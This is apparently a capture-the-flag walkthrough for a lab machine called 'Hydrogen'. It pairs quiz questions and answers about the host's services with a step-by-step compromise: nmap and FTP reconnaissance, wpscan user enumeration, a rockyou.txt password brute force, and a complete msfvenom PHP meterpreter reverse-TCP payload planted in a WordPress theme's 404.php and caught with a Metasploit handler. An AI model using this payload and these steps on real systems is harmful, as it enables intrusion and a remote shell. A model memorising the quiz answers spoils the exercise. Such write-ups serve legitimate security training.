# HYDROGEN

__PROBLEM__

The ip address was 192.168.0.10

__SOLUTION__

So let's start with NMAP tools to the ip address 
`nmap -A -v 192.168.0.10`
and we got the following output
```
Starting Nmap 7.60 ( https://nmap.org ) at 2019-03-15 03:16 UTC
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.2.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           472 Jan 19 12:36 email.txt
|_-r--------   1 ftp      ftp            39 Jan 18 16:31 flag1.txt
|_ftp-bounce: server forbids bouncing to low ports <1025
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey:
|   1024 24:04:bf:3c:02:c8:ac:cd:5e:41:e8:5e:c8:47:96:76 (DSA)
|   2048 28:fd:24:7b:a5:9a:b6:62:ad:d6:3f:b0:4e:7e:ea:e9 (RSA)
|_  256 eb:b8:37:33:af:eb:a2:a7:4a:84:27:6e:35:65:d4:a6 (ECDSA)
80/tcp open  http    nginx 1.2.1
| http-methods:
|_  Supported Methods: GET HEAD
| http-robots.txt: 1 disallowed entry
|_/phpmyadmin
|_http-server-header: nginx/1.2.1
|_http-title: Hydrogen Co
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 03:16
Completed NSE at 03:16, 0.00s elapsed
Initiating NSE at 03:16
Completed NSE at 03:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
```

__PROBLEM__

How many services running on Hydrogencorp

__HINT__

Give me a sum of running services on hydrogencorp.

__ANSWER__

_3_

__PROBLEM__

On the port for file transfer service, what is the version for the application?

__HINT__

Give me the application version number. (e.g 1.2.6)

__ANSWER__

_1.2.6_

__PROBLEM__

What is the software name running on port 80?

__HINT__

Give me the software name running on port 80 on this host. (e.g. IIS)

__ANSWER__

_nginx 1.2.1_

__PROBLEM__

What is the software and version running on port 22?

__HINT__

Give me the software and version running on port 22. (e.g. ProFTPD and 1.4.5

__ANSWER__

_OpenSSH and 6.0p1_

__PROBLEM__

What is the domain name of the application?

__HINT__

Find the domain name of this host. (e.g. example.com)

__ANSWER__

There are also email.txt in ftp service, we check the content and we can see the domain.
```To: John <john@hydrogen.co>
From: Alice <alice@ymail.com>
Date: 19 August 2016
Subject: Applicant for Junior System Administration

---------------------------------------------------

Dear Hiring Manager,

I interested to apply the posting job on your blog.
If I can provide you with any further information on
my background and qualifications, please let me know.

I look Forward to hearing from you. Thank you for your
consideration.

Sincerely,

Alice
alice@ymail.com
```

_hydrogen.co_

__Cont..__

got the domain and the ip, so map the ip address 192.168.0.10 with hydrogen.co at `/etc/hosts`

open hydrogen.co in the browser and get the page.. scrolling the source code and get following snippet

`<!-- <a class="nav-link" href="/wordpress/">Blog</a> -->`

go to the link `hydrogen.co/wordpress` and get the login page.

so the next tool is WPSCAN for the website with the following code..

`wpscan --url hydrogen.co/wordpress --enumerate u` and got the user john 

```
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==========================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] John
 | Detected By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] john
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 ```
 
 brute force the wordpress with rockyou.txt `wpscan --url hydrogen.co/wordpress --enumerate u username john -P rockyou.txt`
 
 ```
 [+] Performing password attack on Xmlrpc Multicall against 2 user/s
[SUCCESS] - John / justin
[SUCCESS] - john / justin
Progress Time: 00:00:03 <                                                            > (1 / 28689)  0.00%  ETA: 26:37:34
[i] Valid Combinations Found:
 | Username: John, Password: justin
 | Username: john, Password: justin

[+] Finished: Fri Mar 15 04:20:18 2019
```

login to the wordpress.. create a payload to get into shell of the ip with this code 

`msfvenom -p php/meterpreter/reverse_tcp LHOST=my ip :P LPORT=4444 -f raw`

and got the payload

```
/*<?php /**/ error_reporting(0); $ip = 'my ip :P'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

setup the payload by paste the payload on wordpress theme 404.php 

listen to the payload through metasploit with this code 

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST my ip :P
set LPORT 4444
exploit
```

go to the browser link at `http://hydrogen.co/wordpress/wp-content/themes/twentythirteen/404.php` and got the shell..

use `cd /` then `find -name "*.txt"` got the other flag directory 

```
./root/flag4.txt
./home/john/flag3.txt
./usr/share/nginx/www/wordpress/flag2.txt
```

found `./usr/share/nginx/www/robots.txt` which is interesting ofcourse..












